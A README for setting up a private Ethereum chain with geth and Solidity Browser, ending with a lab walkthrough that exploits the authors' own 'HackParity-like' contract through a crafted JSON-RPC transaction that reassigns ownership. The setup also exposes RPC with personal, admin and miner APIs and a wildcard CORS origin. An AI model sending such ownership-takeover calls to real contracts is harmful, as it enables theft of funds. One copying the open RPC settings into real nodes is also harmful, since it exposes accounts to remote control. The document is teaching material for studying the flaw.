# README

### I Prerequisite
If your node is supposed to be mining, you need to have at least 4GB of RAM of the local machine running your node

### II Set up your Private Blochain

Correctly configure your `genesis.json` block such as:
```javascript
{
    "config":{
        "chainId":15,
        "homesteadBlock":0,
        "eip155Block":0,
        "eip158Block":0
        },
    "difficulty": "0x400",
    "gasLimit":  "0x80000000",
    "alloc": {
         "d19167868388e320f09d5de3f8d5927f78bc6ce4":{"balance":"3000000"}
    },
    "nonce": "0x0000042",
    "timestamp": "0",
    "parentHash": "0x0000000000000000000000000000000000000000000000000000000000000000",
    "mixhash": "0x0000000000000000000000000000000000000000000000000000000000000000",
    "coinbase": "0x3333333333333333333333333333333333333333"
}
```

Init your blockchain : 
```shell
geth --datadir data/db/ init genesis.json
```

The information of the blockchain will be in `data/db/`. Everytime you start your blockchain, it will read the information needed there. Unlike what's commonly thought, the `networkid` is just a mean of connecting nodes between them, the data comes from that `--datadir` option.

We will then need to create an account usable and credit it. 

Launch your private blockchain
```shell
geth --nodiscover --datadir data/db --networkid 15 --rpc --rpcapi personal,web3,eth,accounts,admin,miner,net,txpool --identity block1 --rpccorsdomain "*" --rpcaddr <ip> --mine --gasprice "1"
```

Use the javascript console to interact with it :

```shell
geth attach <datadir>/geth.ipc
```

In the ethereum javascript console : 
```javascript
personal.newAccount("yourPassword")
```

Take the address of your new account and paste it into your `genesis.json` file, in the `alloc` property, instead of the `d19167868388e320f09d5de3f8d5927f78bc6ce4` address.

You now have an account that's ready to be used, but it still needs to get credited some money.
For that, we will re-init our blockchain.
Exit your ethereum javascript console and do the following :

```shell
$ cd <datadir>
$ rm -rf geth/
```

This allows you to destroy any information on the blockchain but the accounts created.

Init your blockchain again, this time it will credit your account.

```shell
geth --datadir data/db/ init genesis.json
```

Launch it again
```shell
geth --nodiscover --datadir data/db --networkid 15 --rpc --rpcapi personal,web3,eth,accounts,admin,miner,net,txpool --identity block1 --rpccorsdomain "*" --rpcaddr <ip> --mine --gasprice "1"
```

You are ready to go !

### III Interact with a smart contract using Solidity Browser

Start by pasting your smart contract in the code edition window.

If your code has no warnings you are ready to go.

In the top-right corner, select ```Run``` then ```Environment```, ```Web3Provider```. Type the url and port towards your ethereum node.

Be careful though, you might need to connect to the solidity-browser interface via http, and not https !


Once the connection is made, you should see your blockchain accounts in the ```Accounts``` list. Select the account you want to pay for the mining and click on ```Create```.

The console will indicate when the mining is successful, or if you need to unlock that account.
If you need to unlock your account, go to your geth console : 

```bash
geth attach $datadir/geth.ipc
``` 

on your node, and type 

```javascript
personal.unlockAccount('youraccount', 'password', duration)
```

Duration should be the time of unlocking in second. You can then go back to solidity-browser, and create your smart contract for good.
When it is mined, an interface to interact with it should appear on the bottom-right.

### IV HackParity Vulnerability

To exploit the HackParity-like smart contract we developed :

Copy/Paste it in a fresh window of the Smart Contract Window of our interface.

On the Run tab, select ```TestLibrary```, mine it.

Paste the address of the library in the ```_library variable``` of the smart contract ```Vulnerable Contract```. 

Mine your ```VulnerableContract```.

Your contract now has an owner which is the person who sent the transaction which created the contract.
To hack it and change its owner, format a transaction like following :


```json
{"jsonrpc":"2.0",
"method":"eth_sendTransaction",
"params":
[
    {"from": <anyAddressWithMoney>, 
    "to": <smartContractAddress>, 
    "data": "0x19ab453c000000000000000000000000<newOwnerAddress>", 
    "gas":"0x5ee0d", //At least 300000 in hexa here
    "gasprice":"0x1"}],
"id":<any int>}
```

Care with the gas. A gas estimate will only compute how much gas you need to send the transaction, not how much you need to execute the smart contract function. 300000 gas is a good start.
Be careful, parameters must be sent in hexa.    
